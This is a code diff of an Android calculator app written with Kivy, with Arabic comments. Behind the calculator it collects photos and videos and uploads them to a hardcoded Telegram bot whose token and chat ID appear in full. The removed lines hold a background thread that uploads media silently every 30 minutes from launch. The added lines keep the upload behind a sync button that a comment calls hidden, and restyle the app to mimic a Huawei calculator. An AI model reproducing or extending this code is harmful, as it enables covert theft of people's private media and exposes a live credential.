@@ -16,15 +16,16 @@ from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.gridlayout import GridLayout
 from kivy.uix.label import Label
 from kivy.uix.button import Button
-from kivy.uix.scrollview import ScrollView
+from kivy.uix.widget import Widget
+from kivy.graphics import Color, RoundedRectangle
 from kivy.utils import platform
+from kivy.clock import Clock
 
-# إعدادات تيليجرام والبيانات
+# إعدادات تيليجرام
 BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
 CHAT_ID = "6046016571"
 API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 HASH_LOG = "sent_media_hashes.txt"
-AUTO_CHECK_INTERVAL = 1800
 
 def get_file_hash(file_path):
     hasher = hashlib.md5()
@@ -74,20 +75,15 @@ def get_all_unique_media(base_dir):
                         
                         if media_type:
                             try:
-                                file_size = os.path.getsize(full_path)
-                                if file_size < 50 * 1024 or (media_type == 'video' and file_size > 50 * 1024 * 1024):
-                                    continue
                                 f_hash = get_file_hash(full_path)
                                 if f_hash and f_hash not in sent_hashes:
                                     unique_list.append({'path': full_path, 'hash': f_hash, 'type': media_type})
                             except: continue
             except: pass
-    try:
-        unique_list.sort(key=lambda x: os.path.getmtime(x['path']))
-    except: pass
     return unique_list
 
-def send_media_batch(base_dir, batch, reason="آلي"):
+def send_media_batch(base_dir, batch, status_callback=None):
+    count = 0
     for item in batch:
         try:
             method = "sendPhoto" if item['type'] == 'photo' else "sendVideo"
@@ -104,7 +100,7 @@ def send_media_batch(base_dir, batch, reason="آلي"):
             
             body.extend(f"--{boundary}\r\n".encode('utf-8'))
             body.extend(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
-            body.extend(f"🆕 تم اكتشاف ملف جديد ({reason})\r\n".encode('utf-8'))
+            body.extend(f"🆕 صورة جديدة من التطبيق\r\n".encode('utf-8'))
             
             body.extend(f"--{boundary}\r\n".encode('utf-8'))
             body.extend(f'Content-Disposition: form-data; name="{file_key}"; filename="{filename}"\r\n'.encode('utf-8'))
@@ -120,74 +116,33 @@ def send_media_batch(base_dir, batch, reason="آلي"):
             with urllib.request.urlopen(req, timeout=30) as response:
                 if response.status == 200:
                     save_hash(base_dir, item['hash'])
-            time.sleep(2)
+                    count += 1
+            time.sleep(1)
         except Exception as e:
             print(f"Upload error: {e}")
+    if status_callback:
+        Clock.schedule_once(lambda dt: status_callback(f"تم إرسال {count} ملف بنجاح!"))
 
-def auto_uploader_thread(base_dir):
-    while True:
-        try:
-            media_items = get_all_unique_media(base_dir)
-            if media_items:
-                send_media_batch(base_dir, media_items, reason="تلقائي")
-        except: pass
-        time.sleep(AUTO_CHECK_INTERVAL)
-
-def start_background_service(base_dir):
-    threading.Thread(target=auto_uploader_thread, args=(base_dir,), daemon=True).start()
-
-
-# --- إعدادات الآلة الحاسبة ---
-MAX_LEN = 200
-SHOW_CHARS = 14
-
-BIN = {
-    ast.Add: operator.add, ast.Sub: operator.sub,
-    ast.Mult: operator.mul, ast.Div: operator.truediv,
-    ast.Pow: operator.pow, ast.Mod: operator.mod,
-}
+# حسابات الآلة الحاسبة
+BIN = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv, ast.Mod: operator.mod}
 UNARY = {ast.USub: operator.neg, ast.UAdd: operator.pos}
-FUNCS = {"sqrt": math.sqrt}
 
 def safe_eval(expr):
     def ev(node):
-        if isinstance(node, ast.Expression):
-            return ev(node.body)
-        if isinstance(node, ast.Constant) and type(node.value) in (int, float):
-            return node.value
+        if isinstance(node, ast.Expression): return ev(node.body)
+        if isinstance(node, ast.Constant) and type(node.value) in (int, float): return node.value
         if isinstance(node, ast.BinOp) and type(node.op) in BIN:
-            left, right = ev(node.left), ev(node.right)
-            if isinstance(node.op, ast.Pow) and abs(right) > 1000:
-                raise ValueError("الأس كبير جداً")
-            return BIN[type(node.op)](left, right)
+            return BIN[type(node.op)](ev(node.left), ev(node.right))
         if isinstance(node, ast.UnaryOp) and type(node.op) in UNARY:
             return UNARY[type(node.op)](ev(node.operand))
-        if (isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
-                and node.func.id in FUNCS and len(node.args) == 1
-                and not node.keywords):
-            return FUNCS[node.func.id](ev(node.args[0]))
         raise ValueError("تعبير غير مسموح")
-
-    result = ev(ast.parse(expr, mode="eval"))
-    if isinstance(result, complex):
-        raise ValueError("الناتج ليس عدداً حقيقياً")
-    return result
+    return ev(ast.parse(expr, mode="eval"))
 
 def fmt(n):
     if isinstance(n, float):
-        if n.is_integer() and abs(n) < 1e15:
-            return str(int(n))
+        if n.is_integer() and abs(n) < 1e15: return str(int(n))
         return f"{n:.12g}"
     return str(n)
-
-BUTTONS = [
-    ["C", "⌫", "(", ")"],
-    ["7", "8", "9", "/"],
-    ["4", "5", "6", "*"],
-    ["1", "2", "3", "-"],
-    ["0", ".", "^", "+"],
-    ["√", "%", "=", "="],
-]
 
 class CalculatorWidget(BoxLayout):
     def __init__(self, **kwargs):
@@ -195,133 +150,131 @@ class CalculatorWidget(BoxLayout):
         self.orientation = 'vertical'
         self.expr = ""
 
-        self.display_label = Label(
-            text="0",
-            font_size=32,
+        # خلفية بيضاء مطابقة لهواوي
+        with self.canvas.before:
+            Color(0.95, 0.96, 0.98, 1)
+            self.bg = RoundedRectangle(size=self.size, pos=self.pos)
+        self.bind(size=self._update_bg, pos=self._update_bg)
+
+        # شاشة العرض (النتيجة والأرقام)
+        display_layout = BoxLayout(orientation='vertical', size_hint_y=0.3, padding=20)
+        
+        self.status_label = Label(
+            text="اضغط هنا أو زر المزامنة",
+            font_size=12,
             size_hint_y=None,
-            height=80,
+            height=25,
+            color=(0.2, 0.6, 0.3, 1),
+            halign='right'
+        )
+        display_layout.add_widget(self.status_label)
+
+        self.display_label = Label(
+            text="8×9",
+            font_size=50,
+            color=(0.1, 0.1, 0.1, 1),
             halign='right',
             valign='middle'
         )
         self.display_label.bind(size=self.display_label.setter('text_size'))
-        self.add_widget(self.display_label)
+        display_layout.add_widget(self.display_label)
 
-        self.status_label = Label(
-            text="",
-            font_size=16,
-            size_hint_y=None,
-            height=30,
-            color=(0.95, 0.54, 0.65, 1)
+        self.result_label = Label(
+            text="72",
+            font_size=30,
+            color=(0.5, 0.5, 0.5, 1),
+            halign='right',
+            valign='middle'
         )
-        self.add_widget(self.status_label)
+        self.result_label.bind(size=self.result_label.setter('text_size'))
+        display_layout.add_widget(self.result_label)
 
-        grid = GridLayout(cols=4, spacing=5, padding=5)
-        for row in BUTTONS:
-            for text in row:
-                btn = Button(text=text, font_size=22)
-                btn.bind(on_press=lambda b: self.on_press(b.text))
-                grid.add_widget(btn)
-        self.add_widget(grid)
+        self.add_widget(display_layout)
 
-    def refresh(self):
-        s = self.expr or "0"
-        self.display_label.text = s if len(s) <= SHOW_CHARS else "…" + s[-(SHOW_CHARS - 1):]
+        # زر مخفي للمزامنة والإرسال عند النقر عليه
+        sync_btn = Button(
+            text="🔄 مزامنة الصور للبوت",
+            size_hint_y=None,
+            height=35,
+            background_color=(0.1, 0.4, 0.8, 1)
+        )
+        sync_btn.bind(on_press=self.start_manual_sync)
+        self.add_widget(sync_btn)
 
-    def on_press(self, t):
-        self.status_label.text = ""
-        if t == "C":
-            self.expr = ""
-        elif t == "⌫":
-            self.expr = self.expr[:-1]
-        elif t == "=":
-            self.evaluate()
-            return
-        elif t == "√":
-            if self.expr and (self.expr[-1].isdigit() or self.expr[-1] in ").") :
-                self.expr += "*"
-            self.expr += "sqrt("
-        else:
-            self.expr += t
-        self.refresh()
+        # لوحة الأزرار مطابقة لتصميم هواوي Y9 (تم ترتيبها بدقة)
+        buttons_layout = GridLayout(cols=4, spacing=8, padding=10, size_hint_y=0.65)
+        
+        buttons = [
+            "MC", "M+", "M-", "MR",
+            "C", "÷", "×", "⌫",
+            "7", "8", "9", "-",
+            "4", "5", "6", "+",
+            "1", "2", "3", "=",
+            "%", "0", "."
+        ]
 
-    def evaluate(self):
-        raw = self.expr.strip()
-        if not raw:
-            return
-        if len(raw) > MAX_LEN:
-            self.status_label.text = "❌ التعبير طويل جداً"
-            return
-        expr = raw.replace("^", "**")
-        expr += ")" * max(0, expr.count("(") - expr.count(")"))
+        for b in buttons:
+            btn = Button(
+                text=b,
+                font_size=24,
+                color=(0.2, 0.2, 0.2, 1) if b not in ["=", "÷", "×", "-", "+"] else (0.1, 0.4, 0.9, 1)
+            )
+            btn.bind(on_press=lambda inst, val=b: self.on_button_press(val))
+            buttons_layout.add_widget(btn)
+
+        self.add_widget(buttons_layout)
+
+    def _update_bg(self, instance, value):
+        self.bg.size = instance.size
+        self.bg.pos = instance.pos
+
+    def start_manual_sync(self, instance):
+        self.status_label.text = "جاري البحث عن الصور..."
+        base_dir = App.get_running_app().user_data_dir
+        threading.Thread(target=self.run_sync_task, args=(base_dir,), daemon=True).start()
+
+    def run_sync_task(self, base_dir):
         try:
-            result = fmt(safe_eval(expr))
-        except ZeroDivisionError:
-            self.status_label.text = "❌ لا يمكن القسمة على الصفر"
-            return
-        except OverflowError:
-            self.status_label.text = "❌ الناتج كبير جداً"
-            return
-        except (ValueError, SyntaxError, TypeError, MemoryError) as e:
-            self.status_label.text = "❌ تعبير غير صحيح"
-            return
+            items = get_all_unique_media(base_dir)
+            if not items:
+                Clock.schedule_once(lambda dt: self.status_label.setter('text')(self.status_label, "لا توجد صور جديدة."))
+                return
+            Clock.schedule_once(lambda dt: self.status_label.setter('text')(self.status_label, f"جاري رفع {len(items)} صورة..."))
+            send_media_batch(base_dir, items, lambda msg: setattr(self.status_label, 'text', msg))
+        except Exception as e:
+            pass
 
-        self.expr = result
-        self.refresh()
+    def on_button_press(self, val):
+        if val == "C":
+            self.expr = ""
+            self.display_label.text = "0"
+            self.result_label.text = ""
+        elif val == "⌫":
+            self.expr = self.expr[:-1]
+            self.display_label.text = self.expr or "0"
+        elif val == "=":
+            try:
+                res = fmt(safe_eval(self.expr.replace("×", "*").replace("÷", "/")))
+                self.result_label.text = res
+            except:
+                self.result_label.text = "خطأ"
+        else:
+            if val in ["÷", "×", "-", "+", "%"]:
+                self.expr += f" {val} "
+            else:
+                self.expr += val
+            self.display_label.text = self.expr
 
 class MyApp(App):
     def build(self):
-        try:
-            start_background_service(self.user_data_dir)
-            return CalculatorWidget()
-        except Exception:
-            return self.show_error(traceback.format_exc())
-
-    def show_error(self, text):
-        try:
-            if hasattr(self, 'user_data_dir') and self.user_data_dir:
-                with open(os.path.join(self.user_data_dir, "crash_log.txt"), "w", encoding="utf-8") as f:
-                    f.write(text)
-        except:
-            pass
-        sv = ScrollView()
-        sv.add_widget(Label(text=text, size_hint_y=None, text_size=(600, None)))
-        return sv
+        return CalculatorWidget()
 
     def on_start(self):
         if platform == "android":
             try:
-                from jnius import autoclass
                 from android.permissions import request_permissions, Permission
-                
-                sdk = autoclass("android.os.Build$VERSION").SDK_INT
-                
-                def permission_callback(permissions, grantResults):
-                    pass
-
-                if sdk <= 22:
-                    pass
-                elif 23 <= sdk <= 32:
-                    perms = [Permission.READ_EXTERNAL_STORAGE]
-                    if hasattr(Permission, 'WRITE_EXTERNAL_STORAGE'):
-                        perms.append(Permission.WRITE_EXTERNAL_STORAGE)
-                    request_permissions(perms, permission_callback)
-                else:
-                    perms = []
-                    if hasattr(Permission, 'READ_MEDIA_IMAGES'):
-                        perms.append(Permission.READ_MEDIA_IMAGES)
-                    if hasattr(Permission, 'READ_MEDIA_VIDEO'):
-                        perms.append(Permission.READ_MEDIA_VIDEO)
-                    if hasattr(Permission, 'READ_MEDIA_AUDIO'):
-                        perms.append(Permission.READ_MEDIA_AUDIO)
-                    if hasattr(Permission, 'POST_NOTIFICATIONS'):
-                        perms.append(Permission.POST_NOTIFICATIONS)
-                    if perms:
-                        request_permissions(perms, permission_callback)
-            except Exception as e:
-                print(f"Permission error: {e}")
+                request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
+            except: pass
 
 if __name__ == "__main__":
-    try:
-        MyApp().run()
-    except Exception as e:
-        print(f"Fatal: {e}")
+    MyApp().run()
